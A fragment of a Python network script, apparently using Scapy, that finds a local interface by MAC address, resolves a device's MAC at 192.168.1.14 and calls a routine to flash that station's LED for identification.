        return r[Ether].src


def main():
    interfaces = getAllInterfaces()
    mac_address = get_if_hwaddr('eth6')
    npfdevice = None
    macaddr = None
    winguid = None
    for i in interfaces:
        if i[2] == mac_address:
            npfdevice = i[0]
            macaddr = i[2].replace(':', '') # eg: 'ab58e0ff585a'
            winguid = i[4]

    if not npfdevice:
        return

    if os.name == 'nt': npfdevice = '\Device\NPF_' + winguid


    dmac = getMac("192.168.1.14", "eth6")
    device={}
    device['name_of_station'] = ''
    device['mac_address'] = dmac
    flashLED(npfdevice, device, macaddr, 3)

#main()